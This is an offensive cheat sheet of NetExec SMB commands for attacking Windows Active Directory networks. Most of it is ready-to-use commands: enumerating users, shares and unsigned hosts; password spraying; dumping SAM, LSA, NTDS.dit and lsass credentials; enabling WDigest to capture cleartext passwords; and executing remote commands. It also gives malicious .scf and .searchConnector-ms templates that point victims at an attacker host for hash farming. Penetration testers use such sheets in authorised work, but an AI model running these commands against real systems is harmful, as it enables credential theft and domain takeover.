# nxc

% nxc-smb, netexec, windows, Active directory



## smb - enumerate hosts, network
#plateform/linux #target/remote #port/445 #protocol/smb #cat/RECON
Example : nxc smb 192.168.1.0/24

https://mpgn.gitbook.io/netexec/

```bash
nxc smb <ip_range>
```

## smb - enumerate password policy
#plateform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/RECON

```bash
nxc smb <ip> -u <user> -p '<password>' --pass-pol
```

## smb - enumerate null session
#plateform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/ATTACK/CONNECT

```bash
nxc smb <ip> -u '' -p ''
```

## smb - enumerate anonymous login
#plateform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/ATTACK/CONNECT

```bash
nxc smb <ip> -u 'a' -p ''
```

## smb - enumerate active sessions
#plateform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/RECON 

```bash
nxc smb <ip> -u <user> -p '<password>' --sessions
```

## smb - enumerate domain users
#plateform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/RECON 

```bash
nxc smb <ip> -u <user> -p '<password>' --users
```

## smb - enumerate local users by bruteforce the RID
#plateform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/RECON 

```bash
nxc smb <ip> -u <user> -p '<password>' --rid-brute <max>
```

## smb - enumerate domain groups
#plateform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/RECON 

```bash
nxc smb <ip> -u <user> -p '<password>' --groups
```

## smb - enumerate local groups
#plateform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/RECON 

```bash
nxc smb <ip> -u <user> -p '<password>' --local-groups
```

## smb - enumerate shares
#plateform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/RECON 

Enumerate permissions on all shares

```bash
nxc smb <ip> -u <user> -p <password> -d <domain_fqdn> --shares
```

## smb - spider shares
#plateform/linux #target/remote #port/445 #protocol/smb #cat/RECON 
```bash
nxc smb <ip> -u <user> -p '<password>' -M spider_plus
```

## smb - enumerate disks
#plateform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/RECON 

Enumerate disks on the remote target

```bash
nxc smb <ip> -u <user> -p '<password>' --disks
```

## smb - enumerate smb target not signed
#plateform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/RECON

Maps the network of live hosts and saves a list of only the hosts that  don't require SMB signing. List format is one IP per line

```bash
nxc smb <ip> --gen-relay-list smb_targets.txt
```

## smb - enumerate logged users
#plateform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/RECON 

```bash
nxc smb <ip> -u <user> -p '<password>' --loggedon-users
```

## smb - enable wdigest
#plateform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/POSTEXPLOIT  #warning/modify_target 

enable/disable the WDigest provider and dump clear-text credentials from LSA memory.

```bash
nxc smb <ip> -u <user|Administrator> -p '<password>' --local-auth --wdigest enable
```

## smb - loggout user
#plateform/linux #target/remote #port/445 #port/139 #protocol/smb #warning/modify_target #cat/POSTEXPLOIT

Can be useful after enable wdigest to force user to reconnect
First use  -x 'quser'
```bash

nxc smb <ip> -u <user> -p '<password>' -x 'logoff <id_user>' --no-output
```

## smb - local-auth
#plateform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/ATTACK/CONNECT  

```bash
nxc smb <ip> -u <user> -p <password> --local-auth
```

## smb - local-auth with hash
#plateform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/ATTACK/CONNECT 

```bash
nxc smb <ip> -u <user> -H <nt_hash> --local-auth
```

## smb - domain auth
#plateform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/ATTACK/CONNECT  

```bash
nxc smb <ip> -u <user> -p <password> -d <domain_fqdn>
```

## smb - kerberos auth
#plateform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/ATTACK/CONNECT 

Previously import ticket : 
export KRB5CCNAME=<ccache>

```bash
nxc smb <ip> --kerberos
```

## smb - Dump SAM
#plateform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/POSTEXPLOIT/CREDS_RECOVER

Dump SAM hashes using methods from secretsdump.py
You need at least local admin privilege on the remote target, use option --local-auth if your user is a local account

```bash
nxc smb <ip> -u <user> -p <password> -d <domain_fqdn> --sam
```

## smb - Dump LSA
#plateform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/POSTEXPLOIT/CREDS_RECOVER

Dump LSA secrets using methods from secretsdump.py
Requires Domain Admin or Local Admin Privileges on target Domain Controller

```bash
nxc smb <ip> -u <user> -p <password> -d <domain_fqdn> --lsa
```

## smb - dump ntds.dit
#plateform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/POSTEXPLOIT/CREDS_RECOVER

Dump the NTDS.dit from target DC using methods from secretsdump.py
Requires Domain Admin or Local Admin Privileges on target Domain Controller

```bash
nxc smb <ip> -u <user> -p <password> -d <domain_fqdn> --ntds
```

## smb - dump lsass
#plateform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/POSTEXPLOIT/CREDS_RECOVER

```bash
nxc smb <ip> -u <user> -p <password> -d <domain_fqdn> -M lsassy
```

## smb - dump lsass - with bloodhond update
#plateform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/POSTEXPLOIT/CREDS_RECOVER

```bash
nxc smb <ip> --local-auth -u <user> -H <nt_hash> -M lsassy -o BLOODHOUND=True NEO4JUSER=<user|neo4j> NEO4JPASS=<neo4jpass|exegol4thewin>
```

## smb - password spray (user=password)
#plateform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/ATTACK/BRUTEFORCE-SPRAY 

```bash
nxc smb <dc_ip> -u <user.txt> -p <password.txt> --no-bruteforce --continue-on-success
```

## smb - password spray multiple test 
#plateform/linux #target/remote #port/445 #protocol/smb #cat/ATTACK/BRUTEFORCE-SPRAY #tag/warning

(carrefull on lockout)

```bash
nxc smb <dc_ip> -u <user.txt> -p <password.txt> --continue-on-success
```

## smb - put file
#plateform/linux #target/remote #port/445 #protocol/smb #cat/ATTACK/FILE_TRANSFERT 
Send a local file to the remote target

```bash
nxc smb <ip> -u <user> -p <password> --put-file <local_file> <remote_path|\\Windows\\Temp\\target.txt>
```

## smb - get file
#plateform/linux #target/remote #port/445 #protocol/smb #cat/ATTACK/FILE_TRANSFERT 
Send a local file to the remote target

```bash
nxc smb <ip> -u <user> -p <password> --get-file <remote_path|\\Windows\\Temp\\target.txt> <local_file>
```


## smb - find vulnerable to petitpotam coerce 
#plateform/linux #target/remote #port/445 #protocol/smb #cat/RECON 

```bash
nxc smb <ip> -u <user> -p <password> -M PetitPotam
```

## smb - find runing WebDav clients (coerce over http)
#plateform/linux #target/remote #port/445 #protocol/smb #cat/RECON 
try to force WebDav to start  with -M drop-sc
```bash
nxc smb <ip_range> -u <user> -p <passwd> -M webdav
```

## smb - Checking if the service spooler is running
#plateform/linux #target/remote #port/445 #protocol/smb #cat/RECON 
```bash
nxc smb <ip_range> -u <user> -p <passwd> -M spooler
```

## smb - drop malicious ..searchConnector-ms file  (enable WebDav)
#plateform/linux #target/remote #port/445 #protocol/smb #cat/ATTACK/COERCE-FILE
in every writable folder on the target server 
	

<?xml version="1.0" encoding="UTF-8"?>
<searchConnectorDescription
xmlns="http://schemas.microsoft.com/windows/2009/searchConnector">
<description>Microsoft Outlook</description>
<isSearchOnlyItem>false</isSearchOnlyItem>
<includeInStartMenuScope>true</includeInStartMenuScope>
<templateInfo>
<folderType>{91475FE5-586B-4EBA-8D75-D17434B8CDF6}</folderType>
</templateInfo>
<simpleLocation>
<url>https://whatever/</url>
</simpleLocation>
</searchConnectorDescription>

```bash
nxc smb <ip_range> -u <user> -p <passwd> -M drop-sc 
```

## smb - drop an malicious .lnk file (hash farming)
#plateform/linux #target/remote #port/445 #protocol/smb #cat/ATTACK/COERCE-FILE
in every writable folder on the target server 
CLEANUP=true

```bash
nxc smb <ip> -u <user> -p <password> -M slinky -o NAME=<file_name> SERVER=<local_ip>
```
 

## smb - drop an malicious .scf file (hash farming)
#plateform/linux #target/remote #port/445 #protocol/smb #cat/ATTACK/COERCE-FILE
in every writable folder on the target server 
CLEANUP=true

[Shell]
Command=2
IconFile=\\X.X.X.X\share\pentestlab.ico
[Taskbar]
Command=ToggleDesktop

```bash
nxc smb <ip> -u <user> -p <password> -M scufy -o NAME=<file_name> SERVER=<local_ip>
```
 
## smb - execute command (cmd)
#plateform/linux #target/remote #port/445 #port/139 #protocol/smb #warning/modify_target #cat/POSTEXPLOIT

```bash
nxc smb <ip> -u <user> -p '<password>' -x '<command>' --no-output
```
 
## smb - execute command (powershell)
#plateform/linux #target/remote #port/445 #port/139 #protocol/smb #warning/modify_target #cat/POSTEXPLOIT

```bash
nxc smb <ip> -u <user> -p '<password>' -X '<command>' --no-output
```